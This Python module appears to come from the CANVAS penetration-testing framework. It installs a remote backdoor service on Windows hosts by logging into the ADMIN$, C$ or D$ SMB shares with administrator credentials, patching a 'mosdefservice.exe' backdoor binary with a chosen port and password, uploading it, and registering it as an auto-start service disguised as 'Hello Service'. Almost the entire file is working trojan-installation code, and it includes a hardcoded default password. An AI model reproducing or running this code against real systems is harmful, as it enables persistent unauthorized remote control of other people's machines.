#! /usr/bin/env python

NOTES = """
Installs a remote MOSDEF service by uploading it and then starting it

For Win32
   This module uses SMB to upload the service using a given username and password. It then
   uses the service control manager to start the service.

   The MOSDEFService itself is modified to listen on whatever port the user wishes.
"""

import sys
if '.' not in sys.path: sys.path.append('.')

import socket
from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
import libs.newsmb.svcctl as svcctl

# GUI info
NAME                            = "Install Remote MOSDEF Service"
DESCRIPTION                     = "Installs remote MOSDEF service over SMB"
VERSION                         = "1"

DOCUMENTATION                   = {}
DOCUMENTATION["Repeatability"]  = "once"
DOCUMENTATION["Notes"]          = """
This module will attempt to make MSRPC calls in order to install a mosdef service.
Once successfully installed, one may use the connecttoservice.py exploit to
send arbitrary commands.
"""

PROPERTY                        = {}
PROPERTY['TYPE']                = "Trojans"
PROPERTY['SITE']                = "Remote"
PROPERTY['ARCH']                = [ ["Windows", "i386"] ]
PROPERTY['VERSION']             = ['2000', 'XP', '2003','2008']

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.version             = 0
        self.host                = ""
        self.port                = 5555
        self.name                = NAME
        self.destdir             = {}
        self.destdir["win32"]    = "%SYSTEMROOT%"
        self.sourceDict          = {}
        self.sourceDict["win32"] = "backdoors/mosdefservice.exe"
        self.binaryName          = "mosdefservice.exe"
        self.serviceName         = "helloservice"
        self.displayName         = "Hello Service"
        self.msrpcuser           = "Administrator"
        self.msrpcpassword       = "jbone"
        self.domain              = ""
        self.password            = "A"*16+"B"*16

    def test(self):
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port",self.port))
        try:
            s = self.connectTo(self.host,self.port)
            if s:
                self.log("Something is already listening on that port!")
                return 0
        except Exception as e:
            # This might be a timeout from the firewall?
            pass
        ret = svcctl.SVCCTL_IsServiceInstalled(self.host, self.msrpcuser, self.msrpcpassword, self.domain, self.serviceName)
        if ret:
            self.log("The service is already installed.")
            return 0
        return 1

    def getargs(self):
        self.host              = self.target.interface
        self.port              = int(self.argsDict.get("port", self.port))
        self.displayName       = self.argsDict.get("displayName", self.displayName)
        self.serviceName       = self.argsDict.get("serviceName", self.serviceName)
        self.binaryName        = self.argsDict.get("binaryName", self.binaryName)
        self.password          = self.argsDict.get("password", self.password)
        self.msrpcuser         = self.argsDict.get("msrpcuser", self.msrpcuser)
        self.msrpcpassword     = self.argsDict.get("msrpcpassword", self.msrpcpassword)
        self.domain            = self.argsDict.get("domain",self.domain)

    def run(self):
        self.getargs()

        if not self.test():
            return 0

        if self.serviceName.count(" "):
            self.log("Service Name can't have spaces!")
            return 0

        self.password = self.password[:32] #32 bytes long always
        self.password = stroverwrite("\x00"*32,self.password,0) #pad to 32 bytes of zeros
        self.log("Using password: %s" % prettyprint(self.password))

        node    = self.argsDict["passednodes"][0]
        self.log("Using Windows MOSDEF Service")
        self.log("Trying to log into ADMIN$/C/D file share")

        vfs = None
        for sharename in [u"ADMIN$",u"C$",u"D$"]:
            vfs = self.exploitnodes("smbclient", [node], {"password":self.msrpcpassword, "user":self.msrpcuser, "filename": sharename, "domain": self.domain})
            if len(vfs):
                if len(vfs[0]):
                    vfs = vfs[0][0]
                else:
                    self.log("Failed to get into that file share...")
                    vfs = None
                    continue

            self.log("VFS=%s"%vfs)

            if vfs:
                self.log("We managed to get into a share on %s!" % self.host)
                self.log(u"Sharename: %s Username: %s Password: %s" % (sharename, self.msrpcuser, self.msrpcpassword))
                break

        if not vfs:
            self.log("Failed: Could not get into a share to upload our file!")
            return 0

        # now we need to transform our input file such that it uses the new port
        sourcefile  = self.sourceDict["win32"]
        data        = file(sourcefile,"rb").read()

        # replace push 5555 with push self.port
        self.log("Using port %d for MOSDEFService"%self.port)
        data                = data.replace(mosdef.assemble("push $5555", "X86"), mosdef.assemble("push $%d"%self.port, "X86"))
        oldpassword         = "A"*16 + "B"*16
        data                = data.replace(oldpassword, self.password)
        modified_sourcefile = sourcefile+".port_%d"%self.port
        outfd               = file(modified_sourcefile,"wb+")
        outfd.write(data)
        outfd.close()

        # now we've written to modified_sourcefile, so we need to use that as our upload src
        upload = self.engine.getModuleExploit("upload")
        self.log("Uploading with VFS: %s" % vfs)
        upload.link(self, nodes=[vfs])
        upload.argsDict["source"]       = modified_sourcefile
        upload.argsDict["destfilename"] = self.binaryName
        self.log(u"Uploading file %s to %s" % (modified_sourcefile, self.binaryName))

        ret = upload.run()

        self.log("upload.result: %s"%ret)
        if not ret:
            self.log("Could not upload file!")
            return 0

        self.log("We were able to upload the file and now we must create a new service that points to it")

        try:
            self.mySVC = svcctl.SVCCTLClient(self.host)
            self.mySVC.set_credentials(username=self.msrpcuser, password=self.msrpcpassword, domain=self.domain)
            self.mySVC.bind()
        except Exception as e:
            self.log("Unable to connect to the RPC interface: %s" % str(e))
            return 0

        self.log('Connected!')

        binarypath      = self.binaryName
        if sharename == "ADMIN$":
            binarypath = "%SYSTEMROOT%\\"+binarypath
        else:
            binarypath = sharename[0]+"\\"+binarypath

        self.log("ServiceName=%s DisplayName=%s BinaryPath=%s"%(self.serviceName,self.displayName,binarypath))

        try:
            handle = self.mySVC.open_manager()
            service_handle = self.mySVC.create_service(handle=handle,
                                                       service_name=self.serviceName,
                                                       binary_pathname=binarypath,
                                                       display_name=self.displayName,
                                                       start_type=svcctl.SVCCTL_SERVICE_AUTO_START)
        except Exception as e:
            self.log('Failed to create the \'%s\' service: %s' % (self.serviceName, str(e)))
            return 0

        self.log("Called create service successfully")

        try:
            service_handle = self.mySVC.open_service(self.serviceName)
        except Exception as e:
            self.log("Was unable to call OpenService!")
            self.log(e)
            return 0

        try:
            self.mySVC.start_service(service_handle)
        except Exception as e:
            self.log("There was an error starting the MOSDEF service: %s" % str(e))
            return 0

        self.log("Successfully installed and started the MOSDEF service.")

        # Closing everything.
        self.mySVC.close_service(service_handle)
        self.mySVC.close_manager()
        return 1



if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()

